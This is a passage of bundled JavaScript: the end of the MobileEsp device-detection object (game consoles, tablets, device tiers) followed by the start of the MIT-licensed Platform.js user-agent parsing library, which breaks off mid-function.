    DetectMaemoTablet: function() {
        if (this.uagent.search(this.maemo) > -1)
            return true;
        //For Nokia N810, must be Linux + Tablet, or else it could be something else.
        if ((this.uagent.search(this.linux) > -1) && (this.uagent.search(this.deviceTablet) > -1) && this.DetectWebOSTablet() && !this.DetectAndroid())
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is an Archos media player/Internet tablet.
    DetectArchos: function() {
        if (this.uagent.search(this.deviceArchos) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is an Internet-capable game console.
    // Includes many handheld consoles.
    DetectGameConsole: function() {
        if (this.DetectSonyPlaystation() || this.DetectNintendo() || this.DetectXbox())
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is a Sony Playstation.
    DetectSonyPlaystation: function() {
        if (this.uagent.search(this.devicePlaystation) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is a handheld gaming device with
    // a touchscreen and modern iPhone-class browser. Includes the Playstation Vita.
    DetectGamingHandheld: function() {
        if ((this.uagent.search(this.devicePlaystation) > -1) && (this.uagent.search(this.devicePlaystationVita) > -1))
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is a Nintendo game device.
    DetectNintendo: function() {
        if (this.uagent.search(this.deviceNintendo) > -1 || this.uagent.search(this.deviceWii) > -1 || this.uagent.search(this.deviceNintendoDs) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is a Microsoft Xbox.
    DetectXbox: function() {
        if (this.uagent.search(this.deviceXbox) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects whether the device is a Brew-powered device.
    //   Note: Limited to older Brew-powered feature phones.
    //   Ignores newer Brew versions like MP. Refer to DetectMobileQuick().
    DetectBrewDevice: function() {
        if (this.uagent.search(this.deviceBrew) > -1)
            return true;
        else
            return false;
    },

    // DEVICE CLASSES

    //**************************
    // Check to see whether the device is *any* 'smartphone'.
    //   Note: It's better to use DetectTierIphone() for modern touchscreen devices. 
    DetectSmartphone: function() {
        //Exclude duplicates from TierIphone
        if (this.DetectTierIphone() || this.DetectS60OssBrowser() || this.DetectSymbianOS() || this.DetectWindowsMobile() || this.DetectBlackBerry() || this.DetectMeegoPhone() || this.DetectPalmOS())
            return true;

        //Otherwise, return false.
        return false;
    },

    //**************************
    // Detects if the current device is a mobile device.
    //  This method catches most of the popular modern devices.
    //  Excludes Apple iPads and other modern tablets.
    DetectMobileQuick: function() {
        if (this.initCompleted || this.isMobilePhone)
            return this.isMobilePhone;

        //Let's exclude tablets.
        if (this.DetectTierTablet())
            return false;

        //Most mobile browsing is done on smartphones
        if (this.DetectSmartphone())
            return true;

        //Catch-all for many mobile devices
        if (this.uagent.search(this.mobile) > -1)
            return true;

        if (this.DetectOperaMobile())
            return true;

        //We also look for Kindle devices
        if (this.DetectKindle() || this.DetectAmazonSilk())
            return true;

        if (this.uagent.search(this.deviceMidp) > -1 || this.DetectBrewDevice())
            return true;

        if ((this.uagent.search(this.engineObigo) > -1) || (this.uagent.search(this.engineNetfront) > -1) || (this.uagent.search(this.engineUpBrowser) > -1))
            return true;

        return false;
    },

    //**************************
    // Detects in a more comprehensive way if the current device is a mobile device.
    DetectMobileLong: function() {
        if (this.DetectMobileQuick())
            return true;
        if (this.DetectGameConsole())
            return true;

        if (this.DetectDangerHiptop() || this.DetectMaemoTablet() || this.DetectSonyMylo() || this.DetectArchos())
            return true;

        if ((this.uagent.search(this.devicePda) > -1) && !(this.uagent.search(this.disUpdate) > -1))
            return true;

        //Detect for certain very old devices with stupid useragent strings.
        if ((this.uagent.search(this.manuSamsung1) > -1) || (this.uagent.search(this.manuSonyEricsson) > -1) || (this.uagent.search(this.manuericsson) > -1) || (this.uagent.search(this.svcDocomo) > -1) || (this.uagent.search(this.svcKddi) > -1) || (this.uagent.search(this.svcVodafone) > -1))
            return true;

        return false;
    },

    //*****************************
    // For Mobile Web Site Design
    //*****************************

    //**************************
    // The quick way to detect for a tier of devices.
    //   This method detects for the new generation of
    //   HTML 5 capable, larger screen tablets.
    //   Includes iPad, Android (e.g., Xoom), BB Playbook, WebOS, etc.
    DetectTierTablet: function() {
        if (this.initCompleted || this.isTierTablet)
            return this.isTierTablet;

        if (this.DetectIpad() || this.DetectAndroidTablet() || this.DetectBlackBerryTablet() || this.DetectFirefoxOSTablet() || this.DetectUbuntuTablet() || this.DetectWebOSTablet())
            return true;
        else
            return false;
    },

    //**************************
    // The quick way to detect for a tier of devices.
    //   This method detects for devices which can 
    //   display iPhone-optimized web content.
    //   Includes iPhone, iPod Touch, Android, Windows Phone 7 and 8, BB10, WebOS, Playstation Vita, etc.
    DetectTierIphone: function() {
        if (this.initCompleted || this.isTierIphone)
            return this.isTierIphone;

        if (this.DetectIphoneOrIpod() || this.DetectAndroidPhone() || this.DetectWindowsPhone() || this.DetectBlackBerry10Phone() || this.DetectPalmWebOS() || this.DetectBada() || this.DetectTizen() || this.DetectFirefoxOSPhone() || this.DetectSailfishPhone() || this.DetectUbuntuPhone() || this.DetectGamingHandheld())
            return true;

        //Note: BB10 phone is in the previous paragraph
        if (this.DetectBlackBerryWebKit() && this.DetectBlackBerryTouch())
            return true;

        else
            return false;
    },

    //**************************
    // The quick way to detect for a tier of devices.
    //   This method detects for devices which are likely to be 
    //   capable of viewing CSS content optimized for the iPhone, 
    //   but may not necessarily support JavaScript.
    //   Excludes all iPhone Tier devices.
    DetectTierRichCss: function() {
        if (this.initCompleted || this.isTierRichCss)
            return this.isTierRichCss;

        //Exclude iPhone and Tablet Tiers and e-Ink Kindle devices
        if (this.DetectTierIphone() || this.DetectKindle() || this.DetectTierTablet())
            return false;

        //Exclude if not mobile
        if (!this.DetectMobileQuick())
            return false;

        //If it's a mobile webkit browser on any other device, it's probably OK.
        if (this.DetectWebkit())
            return true;

        //The following devices are also explicitly ok.
        if (this.DetectS60OssBrowser() || this.DetectBlackBerryHigh() || this.DetectWindowsMobile() || (this.uagent.search(this.engineTelecaQ) > -1))
            return true;

        else
            return false;
    },

    //**************************
    // The quick way to detect for a tier of devices.
    //   This method detects for all other types of phones,
    //   but excludes the iPhone and RichCSS Tier devices.
    // NOTE: This method probably won't work due to poor
    //  support for JavaScript among other devices. 
    DetectTierOtherPhones: function() {
        if (this.initCompleted || this.isTierGenericMobile)
            return this.isTierGenericMobile;

        //Exclude iPhone, Rich CSS and Tablet Tiers
        if (this.DetectTierIphone() || this.DetectTierRichCss() || this.DetectTierTablet())
            return false;

        //Otherwise, if it's mobile, it's OK
        if (this.DetectMobileLong())
            return true;

        else
            return false;
    }

};

//Initialize the MobileEsp object
MobileEsp.InitDeviceScan();

/*!
 * Platform.js
 * Copyright 2014-2018 Benjamin Tan
 * Copyright 2011-2013 John-David Dalton
 * Available under MIT license
 */
;(function() {
    'use strict';

    /** Used to determine if values are of the language type `Object`. */
    var objectTypes = {
        'function': true,
        'object': true
    };

    /** Used as a reference to the global object. */
    var root = (objectTypes[typeof window] && window) || this;

    /** Backup possible global object. */
    var oldRoot = root;

    /** Detect free variable `exports`. */
    var freeExports = objectTypes[typeof exports] && exports;

    /** Detect free variable `module`. */
    var freeModule = objectTypes[typeof module] && module && !module.nodeType && module;

    /** Detect free variable `global` from Node.js or Browserified code and use it as `root`. */
    var freeGlobal = freeExports && freeModule && typeof global == 'object' && global;
    if (freeGlobal && (freeGlobal.global === freeGlobal || freeGlobal.window === freeGlobal || freeGlobal.self === freeGlobal)) {
        root = freeGlobal;
    }

    /**
   * Used as the maximum length of an array-like object.
   * See the [ES6 spec](http://people.mozilla.org/~jorendorff/es6-draft.html#sec-tolength)
   * for more details.
   */
    var maxSafeInteger = Math.pow(2, 53) - 1;

    /** Regular expression to detect Opera. */
    var reOpera = /\bOpera/;

    /** Possible global object. */
    var thisBinding = this;

    /** Used for native method references. */
    var objectProto = Object.prototype;

    /** Used to check for own properties of an object. */
    var hasOwnProperty = objectProto.hasOwnProperty;

    /** Used to resolve the internal `[[Class]]` of values. */
    var toString = objectProto.toString;

    /*--------------------------------------------------------------------------*/

    /**
   * Capitalizes a string value.
   *
   * @private
   * @param {string} string The string to capitalize.
   * @returns {string} The capitalized string.
   */
    function capitalize(string) {
        string = String(string);
        return string.charAt(0).toUpperCase() + string.slice(1);
    }

    /**
   * A utility function to clean up the OS name.
   *
   * @private
   * @param {string} os The OS name to clean up.
   * @param {string} [pattern] A `RegExp` pattern matching the OS name.
   * @param {string} [label] A label for the OS.
   */
    function cleanupOS(os, pattern, label) {
        // Platform tokens are defined at:
        // http://msdn.microsoft.com/en-us/library/ms537503(VS.85).aspx
        // http://web.archive.org/web/20081122053950/http://msdn.microsoft.com/en-us/library/ms537503(VS.85).aspx
        var data = {
            '10.0': '10',
            '6.4': '10 Technical Preview',
            '6.3': '8.1',
            '6.2': '8',
            '6.1': 'Server 2008 R2 / 7',
            '6.0': 'Server 2008 / Vista',
            '5.2': 'Server 2003 / XP 64-bit',
            '5.1': 'XP',
            '5.01': '2000 SP1',
            '5.0': '2000',
            '4.0': 'NT',
            '4.90': 'ME'
        };
        // Detect Windows version from platform tokens.
        if (pattern && label && /^Win/i.test(os) && !/^Windows Phone /i.test(os) && (data = data[/[\d.]+$/.exec(os)])) {
            os = 'Windows ' + data;
        }
        // Correct character case and cleanup string.
        os = String(os);

        if (pattern && label) {
            os = os.replace(RegExp(pattern, 'i'), label);
        }

        os = format(os.replace(/ ce$/i, ' CE').replace(/\bhpw/i, 'web').replace(/\bMacintosh\b/, 'Mac OS').replace(/_PowerPC\b/i, ' OS').replace(/\b(OS X) [^ \d]+/i, '$1').replace(/\bMac (OS X)\b/, '$1').replace(/\/(\d)/, ' $1').replace(/_/g, '.').replace(/(?: BePC|[ .]*fc[ \d.]+)$/i, '').replace(/\bx86\.64\b/gi, 'x86_64').replace(/\b(Windows Phone) OS\b/, '$1').replace(/\b(Chrome OS \w+) [\d.]+\b/, '$1').split(' on ')[0]);

        return os;
    }

    /**
   * An iteration utility for arrays and objects.
   *
   * @private
   * @param {Array|Object} object The object to iterate over.
   * @param {Function} callback The function called per iteration.
   */
    function each(object, callback) {
        var index = -1
          , length = object ? object.length : 0;

        if (typeof length == 'number' && length > -1 && length <= maxSafeInteger) {
            while (++index < length) {
                callback(object[index], index, object);
            }
        } else {
            forOwn(object, callback);
        }
    }

    /**
   * Trim and conditionally capitalize string values.
   *
   * @private
   * @param {string} string The string to format.
   * @returns {string} The formatted string.
   */
    function format(string) {
        string = trim(string);
        return /^(?:webOS|i(?:OS|P))/.test(string) ? string : capitalize(string);
    }

    /**
   * Iterates over an object's own properties, executing the `callback` for each.
   *
   * @private
   * @param {Object} object The object to iterate over.
   * @param {Function} callback The function executed per own property.
   */
    function forOwn(object, callback) {
        for (var key in object) {
            if (hasOwnProperty.call(object, key)) {
                callback(object[key], key, object);
            }
        }
    }

    /**
   * Gets the internal `[[Class]]` of a value.
   *
   * @private
   * @param {*} value The value.
   * @returns {string} The `[[Class]]`.
   */
    function getClassOf(value) {
        return value == null ? capitalize(value) : toString.call(value).slice(8, -1);
    }

    /**
   * Host objects can return type values that are different from their actual
   * data type. The objects we are concerned with usually return non-primitive
   * types of "object", "function", or "unknown".
   *
   * @private
   * @param {*} object The owner of the property.
   * @param {string} property The property to check.
   * @returns {boolean} Returns `true` if the property value is a non-primitive, else `false`.
   */
    function isHostType(object, property) {
        var type = object != null ? typeof object[property] : 'number';
        return !/^(?:boolean|number|string|undefined)$/.test(type) && (type == 'object' ? !!object[property] : true);
    }

    /**
   * Prepares a string for use in a `RegExp` by making hyphens and spaces optional.
   *
   * @private
   * @param {string} string The string to qualify.
   * @returns {string} The qualified string.
   */
    function qualify(string) {
        return String(string).replace(/([ -])(?!$)/g, '$1?');
    }

    /**
   * A bare-bones `Array#reduce` like utility function.
   *
   * @private
   * @param {Array} array The array to iterate over.
   * @param {Function} callback The function called per iteration.
   * @returns {*} The accumulated result.
   */
    function reduce(array, callback) {
        var accumulator = null;
        each(array, function(value, index) {
            accumulator = callback(accumulator, value, index, array);
        });
        return accumulator;
    }

    /**
   * Removes leading and trailing whitespace from a string.
   *
   * @private
   * @param {string} string The string to trim.
   * @returns {string} The trimmed string.
   */
    function trim(string) {
        return String(string).replace(/^ +| +$/g, '');
    }

    /*--------------------------------------------------------------------------*/

    /**
   * Creates a new platform object.
   *
   * @memberOf platform
   * @param {Object|string} [ua=navigator.userAgent] The user agent string or
   *  context object.
   * @returns {Object} A platform object.
   */
    function parse(ua) {

        /** The environment context object. */
        var context = root;

        /** Used to flag when a custom context is provided. */
        var isCustomContext = ua && typeof ua == 'object' && getClassOf(ua) != 'String';

        // Juggle arguments.
        if (isCustomContext) {
            context = ua;
            ua = null;
        }

        /** Browser navigator object. */
        var nav = context.navigator || {};

        /** Browser user agent string. */
        var userAgent = nav.userAgent || '';

        ua || (ua = userAgent);

        /** Used to flag when `thisBinding` is the [ModuleScope]. */
        var isModuleScope = isCustomContext || thisBinding == oldRoot;

        /** Used to detect if browser is like Chrome. */
        var likeChrome = isCustomContext ? !!nav.likeChrome : /\bChrome\b/.test(ua) && !/internal|\n/i.test(toString.toString());

        /** Internal `[[Class]]` value shortcuts. */
        var objectClass = 'Object'
          , airRuntimeClass = isCustomContext ? objectClass : 'ScriptBridgingProxyObject'
          , enviroClass = isCustomContext ? objectClass : 'Environment'
          , javaClass = (isCustomContext && context.java) ? 'JavaPackage' : getClassOf(context.java)
          , phantomClass = isCustomContext ? objectClass : 'RuntimeObject';

        /** Detect Java environments. */
        var java = /\bJava/.test(javaClass) && context.java;

        /** Detect Rhino. */
        var rhino = java && getClassOf(context.environment) == enviroClass;

        /** A character to represent alpha. */
        var alpha = java ? 'a' : '\u03b1';

        /** A character to represent beta. */
        var beta = java ? 'b' : '\u03b2';

        /** Browser document object. */
        var doc = context.document || {};

        /**
     * Detect Opera browser (Presto-based).
     * http://www.howtocreate.co.uk/operaStuff/operaObject.html
     * http://dev.opera.com/articles/view/opera-mini-web-content-authoring-guidelines/#operamini
     */
        var opera = context.operamini || context.opera;

        /** Opera `[[Class]]`. */
        var operaClass = reOpera.test(operaClass = (isCustomContext && opera) ? opera['[[Class]]'] : getClassOf(opera)) ? operaClass : (opera = null);

        /*------------------------------------------------------------------------*/

        /** Temporary variable used over the script's lifetime. */
        var data;

        /** The CPU architecture. */
        var arch = ua;

        /** Platform description array. */
        var description = [];

        /** Platform alpha/beta indicator. */
        var prerelease = null;

        /** A flag to indicate that environment features should be used to resolve the platform. */
        var useFeatures = ua == userAgent;

        /** The browser/environment version. */
        var version = useFeatures && opera && typeof opera.version == 'function' && opera.version();

        /** A flag to indicate if the OS ends with "/ Version" */
        var isSpecialCasedOS;

        /* Detectable layout engines (order is important). */
        var layout = getLayout([{
            'label': 'EdgeHTML',
            'pattern': '(?:Edge|EdgA|EdgiOS)'
        }, 'Trident', {
            'label': 'WebKit',
            'pattern': 'AppleWebKit'
        }, 'iCab', 'Presto', 'NetFront', 'Tasman', 'KHTML', 'Gecko']);

        /* Detectable browser names (order is important). */
        var name = getName(['Adobe AIR', 'Arora', 'Avant Browser', 'Breach', 'Camino', 'Electron', 'Epiphany', 'Fennec', 'Flock', 'Galeon', 'GreenBrowser', 'iCab', 'Iceweasel', 'K-Meleon', 'Konqueror', 'Lunascape', 'Maxthon', {
            'label': 'Microsoft Edge',
            'pattern': '(?:Edge|EdgA|EdgiOS)'
        }, 'Midori', 'Nook Browser', 'PaleMoon', 'PhantomJS', 'Raven', 'Rekonq', 'RockMelt', {
            'label': 'Samsung Internet',
            'pattern': 'SamsungBrowser'
        }, 'SeaMonkey', {
            'label': 'Silk',
            'pattern': '(?:Cloud9|Silk-Accelerated)'
        }, 'Sleipnir', 'SlimBrowser', {
            'label': 'SRWare Iron',
            'pattern': 'Iron'
        }, 'Sunrise', 'Swiftfox', 'Waterfox', 'WebPositive', 'Opera Mini', {
            'label': 'Opera Mini',
            'pattern': 'OPiOS'
        }, 'Opera', {
            'label': 'Opera',
            'pattern': 'OPR'
        }, 'Chrome', {
            'label': 'Chrome Mobile',
            'pattern': '(?:CriOS|CrMo)'
        }, {
            'label': 'Firefox',
            'pattern': '(?:Firefox|Minefield)'
        }, {
            'label': 'Firefox for iOS',
            'pattern': 'FxiOS'
        }, {
            'label': 'IE',
            'pattern': 'IEMobile'
        }, {
            'label': 'IE',
            'pattern': 'MSIE'
        }, 'Safari']);

        /* Detectable products (order is important). */
        var product = getProduct([{
            'label': 'BlackBerry',
            'pattern': 'BB10'
        }, 'BlackBerry', {
            'label': 'Galaxy S',
            'pattern': 'GT-I9000'
        }, {
            'label': 'Galaxy S2',
            'pattern': 'GT-I9100'
        }, {
            'label': 'Galaxy S3',
            'pattern': 'GT-I9300'
        }, {
            'label': 'Galaxy S4',
            'pattern': 'GT-I9500'
        }, {
            'label': 'Galaxy S5',
            'pattern': 'SM-G900'
        }, {
            'label': 'Galaxy S6',
            'pattern': 'SM-G920'
        }, {
            'label': 'Galaxy S6 Edge',
            'pattern': 'SM-G925'
        }, {
            'label': 'Galaxy S7',
            'pattern': 'SM-G930'
        }, {
            'label': 'Galaxy S7 Edge',
            'pattern': 'SM-G935'
        }, 'Google TV', 'Lumia', 'iPad', 'iPod', 'iPhone', 'Kindle', {
            'label': 'Kindle Fire',
            'pattern': '(?:Cloud9|Silk-Accelerated)'
        }, 'Nexus', 'Nook', 'PlayBook', 'PlayStation Vita', 'PlayStation', 'TouchPad', 'Transformer', {
            'label': 'Wii U',
            'pattern': 'WiiU'
        }, 'Wii', 'Xbox One', {
            'label': 'Xbox 360',
            'pattern': 'Xbox'
        }, 'Xoom']);

        /* Detectable manufacturers. */
        var manufacturer = getManufacturer({
            'Apple': {
                'iPad': 1,
                'iPhone': 1,
                'iPod': 1
            },
            'Archos': {},
            'Amazon': {
                'Kindle': 1,
                'Kindle Fire': 1
            },
            'Asus': {
                'Transformer': 1
            },
            'Barnes & Noble': {
                'Nook': 1
            },
            'BlackBerry': {
                'PlayBook': 1
            },
            'Google': {
                'Google TV': 1,
                'Nexus': 1
            },
            'HP': {
                'TouchPad': 1
            },
            'HTC': {},
            'LG': {},
            'Microsoft': {
                'Xbox': 1,
                'Xbox One': 1
            },
            'Motorola': {
                'Xoom': 1
            },
            'Nintendo': {
                'Wii U': 1,
                'Wii': 1
            },
            'Nokia': {
                'Lumia': 1
            },
            'Samsung': {
                'Galaxy S': 1,
                'Galaxy S2': 1,
                'Galaxy S3': 1,
                'Galaxy S4': 1
            },
            'Sony': {
                'PlayStation': 1,
                'PlayStation Vita': 1
            }
        });

        /* Detectable operating systems (order is important). */
        var os = getOS(['Windows Phone', 'Android', 'CentOS', {
            'label': 'Chrome OS',
            'pattern': 'CrOS'
        }, 'Debian', 'Fedora', 'FreeBSD', 'Gentoo', 'Haiku', 'Kubuntu', 'Linux Mint', 'OpenBSD', 'Red Hat', 'SuSE', 'Ubuntu', 'Xubuntu', 'Cygwin', 'Symbian OS', 'hpwOS', 'webOS ', 'webOS', 'Tablet OS', 'Tizen', 'Linux', 'Mac OS X', 'Macintosh', 'Mac', 'Windows 98;', 'Windows ']);

        /*------------------------------------------------------------------------*/

        /**
     * Picks the layout engine from an array of guesses.
     *
     * @private
     * @param {Array} guesses An array of guesses.
     * @returns {null|string} The detected layout engine.
     */
        function getLayout(guesses) {
            return reduce(guesses, function(result, guess) {
                return result || RegExp('\\b' + (guess.pattern || qualify(guess)) + '\\b', 'i').exec(ua) && (guess.label || guess);
            });
        }

        /**
     * Picks the manufacturer from an array of guesses.
     *
     * @private
     * @param {Array} guesses An object of guesses.
     * @returns {null|string} The detected manufacturer.
     */
        function getManufacturer(guesses) {
            return reduce(guesses, function(result, value, key) {
                // Lookup the manufacturer by product or scan the UA for the manufacturer.
                return result || (value[product] || value[/^[a-z]+(?: +[a-z]+\b)*/i.exec(product)] || RegExp('\\b' + qualify(key) + '(?:\\b|\\w*\\d)', 'i').exec(ua)) && key;
            });
        }

        /**
     * Picks the browser name from an array of guesses.
     *
     * @private
     * @param {Array} guesses An array of guesses.
     * @returns {null|string} The detected browser name.
     */
        function getName(guesses) {
            return reduce(guesses, function(result, guess) {
                return result || RegExp('\\b' + (guess.pattern || qualify(guess)) + '\\b', 'i').exec(ua) && (guess.label || guess);
            });
        }

        /**
     * Picks the OS name from an array of guesses.
     *
     * @private
     * @param {Array} guesses An array of guesses.
     * @returns {null|string} The detected OS name.
     */
        function getOS(guesses) {
            return reduce(guesses, function(result, guess) {
                var pattern = guess.pattern || qualify(guess);
                if (!result && (result = RegExp('\\b' + pattern + '(?:/[\\d.]+|[ \\w.]*)', 'i').exec(ua))) {
                    result = cleanupOS(result, pattern, guess.label || guess);
                }
                return result;
            });
        }

        /**
     * Picks the product name from an array of guesses.
     *
     * @private
     * @param {Array} guesses An array of guesses.
     * @returns {null|string} The detected product name.
     */
        function getProduct(guesses) {
            return reduce(guesses, function(result, guess) {
                var pattern = guess.pattern || qualify(guess);
                if (!result && (result = RegExp('\\b' + pattern + ' *\\d+[.\\w_]*', 'i').exec(ua) || RegExp('\\b' + pattern + ' *\\w+-[\\w]*', 'i').exec(ua) || RegExp('\\b' + pattern + '(?:; *(?:[a-z]+[_-])?[a-z]+\\d+|[^ ();-]*)', 'i').exec(ua))) {
                    // Split by forward slash and append product version if needed.
                    if ((result = String((guess.label && !RegExp(pattern, 'i').test(guess.label)) ? guess.label : result).split('/'))[1] && !/[\d.]+/.test(result[0])) {
                        result[0] += ' ' + result[1];
                    }
                    // Correct character case and cleanup string.
                    guess = guess.label || guess;
                    result = format(result[0].replace(RegExp(pattern, 'i'), guess).replace(RegExp('; *(?:' + guess + '[_-])?', 'i'), ' ').replace(RegExp('(' + guess + ')[-_.]?(\\w)', 'i'), '$1 $2'));
                }
                return result;
            });
        }

        /**
     * Resolves the version using an array of UA patterns.
     *
     * @private
     * @param {Array} patterns An array of UA patterns.
     * @returns {null|string} The detected version.
     */
        function getVersion(patterns) {
            return reduce(patterns, function(result, pattern) {
                return result || (RegExp(pattern + '(?:-[\\d.]+/|(?: for [\\w-]+)?[ /-])([\\d.]+[^ ();/_-]*)', 'i').exec(ua) || 0)[1] || null;
            });
        }

        /**
     * Returns `platform.description` when the platform object is coerced to a string.
     *
     * @name toString
     * @memberOf platform
     * @returns {string} Returns `platform.description` if available, else an empty string.
     */
        function toStringPlatform() {
            return this.description || '';
        }

        /*------------------------------------------------------------------------*/

        // Convert layout to an array so we can add extra details.
        layout && (layout = [layout]);

        // Detect product names that contain their manufacturer's name.
        if (manufacturer && !product) {
            product = getProduct([manufacturer]);
        }
        // Clean up Google TV.
        if ((data = /\bGoogle TV\b/.exec(product))) {
            product = data[0];
        }
        // Detect simulators.
        if (/\bSimulator\b/i.test(ua)) {
            product = (product ? product + ' ' : '') + 'Simulator';
        }
        // Detect Opera Mini 8+ running in Turbo/Uncompressed mode on iOS.
        if (name == 'Opera Mini' && /\bOPiOS\b/.test(ua)) {
            description.push('running in Turbo/Uncompressed mode');
        }
        // Detect IE Mobile 11.
        if (name == 'IE' && /\blike iPhone OS\b/.test(ua)) {
            data = parse(ua.replace(/like iPhone OS/, ''));
            manufacturer = data.manufacturer;
            product = data.product;
        }// Detect iOS.
        else if (/^iP/.test(product)) {
            name || (name = 'Safari');
            os = 'iOS' + ((data = / OS ([\d_]+)/i.exec(ua)) ? ' ' + data[1].replace(/_/g, '.') : '');
        }// Detect Kubuntu.
        else if (name == 'Konqueror' && !/buntu/i.test(os)) {
            os = 'Kubuntu';
        }// Detect Android browsers.
        else if ((manufacturer && manufacturer != 'Google' && ((/Chrome/.test(name) && !/\bMobile Safari\b/i.test(ua)) || /\bVita\b/.test(product))) || (/\bAndroid\b/.test(os) && /^Chrome/.test(name) && /\bVersion\//i.test(ua))) {
            name = 'Android Browser';
            os = /\bAndroid\b/.test(os) ? os : 'Android';
        }// Detect Silk desktop/accelerated modes.
        else if (name == 'Silk') {
            if (!/\bMobi/i.test(ua)) {
                os = 'Android';
                description.unshift('desktop mode');
            }
            if (/Accelerated *= *true/i.test(ua)) {
                description.unshift('accelerated');
            }
        }// Detect PaleMoon identifying as Firefox.
        else if (name == 'PaleMoon' && (data = /\bFirefox\/([\d.]+)\b/.exec(ua))) {
            description.push('identifying as Firefox ' + data[1]);
        }// Detect Firefox OS and products running Firefox.
        else if (name == 'Firefox' && (data = /\b(Mobile|Tablet|TV)\b/i.exec(ua))) {
            os || (os = 'Firefox OS');
            product || (product = data[1]);
        }// Detect false positives for Firefox/Safari.
        else if (!name || (data = !/\bMinefield\b/i.test(ua) && /\b(?:Firefox|Safari)\b/.exec(name))) {
            // Escape the `/` for Firefox 1.
            if (name && !product && /[\/,]|^[^(]+?\)/.test(ua.slice(ua.indexOf(data + '/') + 8))) {
                // Clear name of false positives.
                name = null;
            }
            // Reassign a generic name.
            if ((data = product || manufacturer || os) && (product || manufacturer || /\b(?:Android|Symbian OS|Tablet OS|webOS)\b/.test(os))) {
                name = /[a-z]+(?: Hat)?/i.exec(/\bAndroid\b/.test(os) ? os : data) + ' Browser';
            }
        }// Add Chrome version to description for Electron.
        else if (name == 'Electron' && (data = (/\bChrome\/([\d.]+)\b/.exec(ua) || 0)[1])) {
            description.push('Chromium ' + data);
        }
        // Detect non-Opera (Presto-based) versions (order is important).
        if (!version) {
            version = getVersion(['(?:Cloud9|CriOS|CrMo|Edge|EdgA|EdgiOS|FxiOS|IEMobile|Iron|Opera ?Mini|OPiOS|OPR|Raven|SamsungBrowser|Silk(?!/[\\d.]+$))', 'Version', qualify(name), '(?:Firefox|Minefield|NetFront)']);
        }
        // Detect stubborn layout engines.
        if ((data = layout == 'iCab' && parseFloat(version) > 3 && 'WebKit' || /\bOpera\b/.test(name) && (/\bOPR\b/.test(ua) ? 'Blink' : 'Presto') || /\b(?:Midori|Nook|Safari)\b/i.test(ua) && !/^(?:Trident|EdgeHTML)$/.test(layout) && 'WebKit' || !layout && /\bMSIE\b/i.test(ua) && (os == 'Mac OS' ? 'Tasman' : 'Trident') || layout == 'WebKit' && /\bPlayStation\b(?! Vita\b)/i.test(name) && 'NetFront')) {
            layout = [data];
        }
        // Detect Windows Phone 7 desktop mode.
        if (name == 'IE' && (data = (/; *(?:XBLWP|ZuneWP)(\d+)/i.exec(ua) || 0)[1])) {
            name += ' Mobile';
            os = 'Windows Phone ' + (/\+$/.test(data) ? data : data + '.x');
            description.unshift('desktop mode');
        }// Detect Windows Phone 8.x desktop mode.
        else if (/\bWPDesktop\b/i.test(ua)) {
            name = 'IE Mobile';
            os = 'Windows Phone 8.x';
            description.unshift('desktop mode');
            version || (version = (/\brv:([\d.]+)/.exec(ua) || 0)[1]);
        }// Detect IE 11 identifying as other browsers.
        else if (name != 'IE' && layout == 'Trident' && (data = /\brv:([\d.]+)/.exec(ua))) {
            if (name) {
                description.push('identifying as ' + name + (version ? ' ' + version : ''));
            }
            name = 'IE';
            version = data[1];
        }
        // Leverage environment features.
        if (useFeatures) {
            // Detect server-side environments.
            // Rhino has a global function while others have a global object.
            if (isHostType(context, 'global')) {
                if (java) {
                    data = java.lang.System;
                    arch = data.getProperty('os.arch');
                    os = os || data.getProperty('os.name') + ' ' + data.getProperty('os.version');
                }
                if (rhino) {
                    try {
                        version = context.require('ringo/engine').version.join('.');
                        name = 'RingoJS';
                    } catch (e) {
                        if ((data = context.system) && data.global.system == context.system) {
                            name = 'Narwhal';
                            os || (os = data[0].os || null);
                        }
                    }
                    if (!name) {
                        name = 'Rhino';
                    }
                } else if (typeof context.process == 'object' && !context.process.browser && (data = context.process)) {
                    if (typeof data.versions == 'object') {
                        if (typeof data.versions.electron == 'string') {
                            description.push('Node ' + data.versions.node);
                            name = 'Electron';
                            version = data.versions.electron;
                        } else if (typeof data.versions.nw == 'string') {
                            description.push('Chromium ' + version, 'Node ' + data.versions.node);
                            name = 'NW.js';
                            version = data.versions.nw;
                        }
                    }
                    if (!name) {
                        name = 'Node.js';
                        arch = data.arch;
                        os = data.platform;
                        version = /[\d.]+/.exec(data.version);
                        version = version ? version[0] : null;
                    }
                }
            }// Detect Adobe AIR.
            else if (getClassOf((data = context.runtime)) == airRuntimeClass) {
                name = 'Adobe AIR';
                os = data.flash.system.Capabilities.os;
            }// Detect PhantomJS.
            else if (getClassOf((data = context.phantom)) == phantomClass) {
                name = 'PhantomJS';
                version = (data = data.version || null) && (data.major + '.' + data.minor + '.' + data.patch);
            }// Detect IE compatibility modes.
            else if (typeof doc.documentMode == 'number' && (data = /\bTrident\/(\d+)/i.exec(ua))) {
                // We're in compatibility mode when the Trident version + 4 doesn't
                // equal the document mode.
                version = [version, doc.documentMode];
                if ((data = +data[1] + 4) != version[1]) {
                    description.push('IE ' + version[1] + ' mode');
                    layout && (layout[1] = '');
                    version[1] = data;
                }
                version = name == 'IE' ? String(version[1].toFixed(1)) : version[0];
            }// Detect IE 11 masking as other browsers.
            else if (typeof doc.documentMode == 'number' && /^(?:Chrome|Firefox)\b/.test(name)) {
                description.push('masking as ' + name + ' ' + version);
                name = 'IE';
                version = '11.0';
                layout = ['Trident'];
                os = 'Windows';
            }
            os = os && format(os);
        }
        // Detect prerelease phases.
        if (version && (data = /(?:[ab]|dp|pre|[ab]\d+pre)(?:\d+\+?)?$/i.exec(version) || /(?:alpha|beta)(?: ?\d)?/i.exec(ua + ';' + (useFeatures && nav.appMinorVersion)) || /\bMinefield\b/i.test(ua) && 'a')) {
            prerelease = /b/i.test(data) ? 'beta' : 'alpha';
            version = version.replace(RegExp(data + '\\+?$'), '') + (prerelease == 'beta' ? beta : alpha) + (/\d+\+?/.exec(data) || '');
        }
        // Detect Firefox Mobile.
        if (name == 'Fennec' || name == 'Firefox' && /\b(?:Android|Firefox OS)\b/.test(os)) {
